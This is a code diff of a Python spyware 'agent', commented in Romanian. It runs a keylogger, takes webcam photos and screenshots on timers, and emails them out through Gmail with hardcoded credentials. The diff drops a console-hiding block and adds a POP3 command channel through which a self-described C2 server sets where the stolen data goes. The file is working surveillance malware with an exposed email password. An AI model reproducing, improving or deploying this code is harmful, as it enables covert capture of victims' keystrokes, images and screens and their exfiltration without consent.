@@ -16,29 +16,22 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 import tempfile
 
-# ====================== CONFIGURARE EMAIL ======================
-EMAIL_CONFIG = {
-    'smtp_server': 'smtp.gmail.com',
-    'smtp_port': 587,
-    'pop3_server': 'pop.gmail.com',
-    'pop3_port': 995,
-    'sender_email': 'romanbogdan475@gmail.com',
-    'sender_password': 'cxzv ddop qosk hvdy',
-    'recipient_email': 'timoteiroman19@gmail.com'
+# ====================== CONFIGURARE SMTP ======================
+SMTP_CONFIG = {
+    'server': 'smtp.gmail.com',
+    'port': 587,
+    'email': 'romanbogdan475@gmail.com',
+    'password': 'cxzv ddop qosk hvdy'
 }
-
-# Ascunde consola
-if sys.platform == "win32":
-    try:
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except:
-        pass
 
 class Agent:
     def __init__(self):
+        self.recipient_email = None
         self.keylogger_running = False
         self.camera_running = True
         self.screenshot_running = True
+        
+        self.key_listener = None
         self.buffer = ""
         
         self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
@@ -48,20 +41,24 @@ class Agent:
         os.makedirs(self.photo_folder, exist_ok=True)
         os.makedirs(self.screenshot_folder, exist_ok=True)
         
-        print("[+] Agent pornit - Trimitere individuală")
+        print("[+] Agent pornit - Așteaptă SET_RECIPIENT din C2")
 
-        # Pornim toate automat
-        self.start_keylogger()
-        self.start_keylog_sender()
+        self.start_keylogger()          # Pornim keylogger-ul
+        self.start_keylog_sender()      # Trimitem tastele individual
         self.start_auto_camera()
         self.start_auto_screenshot()
+        self.start_command_checker()
 
     # ====================== TRIMITERE EMAIL ======================
     def send_email(self, subject, body, attachments=None):
+        if not self.recipient_email:
+            print("[-] Adresa de recepție nu este setată!")
+            return False
+
         try:
             msg = MIMEMultipart()
-            msg['From'] = EMAIL_CONFIG['sender_email']
-            msg['To'] = EMAIL_CONFIG['recipient_email']
+            msg['From'] = SMTP_CONFIG['email']
+            msg['To'] = self.recipient_email
             msg['Subject'] = subject
             msg.attach(MIMEText(body, 'plain'))
 
@@ -73,9 +70,9 @@ class Agent:
                                 img = MIMEImage(f.read(), name=os.path.basename(file_path))
                                 msg.attach(img)
 
-            with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
+            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                 server.starttls()
-                server.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['sender_password'])
+                server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                 server.send_message(msg)
             
             print(f"[+] Trimis: {subject}")
@@ -109,7 +106,6 @@ class Agent:
         self.key_listener.start()
         print("[+] Keylogger pornit")
 
-    # ====================== TRIMITERE KEYLOGGER ======================
     def start_keylog_sender(self):
         def loop():
             while True:
@@ -117,11 +113,11 @@ class Agent:
                 if self.buffer.strip():
                     self.send_email("KEYLOG", f"Keylogger Report:\n\n{self.buffer}")
                     print(f"[+] Keylogger trimis ({len(self.buffer)} caractere)")
-                    self.buffer = ""
+                    self.buffer = ""   # Golim buffer-ul
                 else:
                     print("[DEBUG] Buffer gol")
         threading.Thread(target=loop, daemon=True).start()
-        print("[+] Trimitere keylog pornită (25 secunde)")
+        print("[+] Trimitere keylog individual pornită (25 secunde)")
 
     # ====================== CAMERA ======================
     def start_auto_camera(self):
@@ -163,9 +159,40 @@ class Agent:
         threading.Thread(target=loop, daemon=True).start()
         print("[+] Auto Screenshot pornit (90 secunde)")
 
+    # ====================== COMENZI ======================
+    def start_command_checker(self):
+        def loop():
+            while True:
+                try:
+                    pop_conn = poplib.POP3_SSL('pop.gmail.com', 995)
+                    pop_conn.user(SMTP_CONFIG['email'])
+                    pop_conn.pass_(SMTP_CONFIG['password'])
+                    
+                    num_messages = len(pop_conn.list()[1])
+                    for i in range(max(1, num_messages - 20), num_messages + 1):
+                        raw_email = b"\n".join(pop_conn.retr(i)[1])
+                        msg = email.message_from_bytes(raw_email)
+                        subject = msg.get('Subject', '').strip()
+
+                        if subject.startswith('COMMAND:'):
+                            command = subject[9:].strip()
+                            print(f"[*] Comandă primită: {command}")
+                            if command.startswith("SET_RECIPIENT:"):
+                                new_email = command[13:].strip()
+                                if "@" in new_email:
+                                    self.recipient_email = new_email
+                                    print(f"[+] Recepție setată la: {new_email}")
+                                    self.send_email("INFO", f"Adresă actualizată: {new_email}")
+                    
+                    pop_conn.quit()
+                except:
+                    pass
+                time.sleep(25)
+        threading.Thread(target=loop, daemon=True).start()
+
 if __name__ == "__main__":
     agent = Agent()
-    print("Agentul rulează ascuns. Keylogger, Poze și Screenshots se trimit individual.")
+    print("Agentul rulează. Trimite comanda SET_RECIPIENT: din C2 Server.")
     
     try:
         while True:
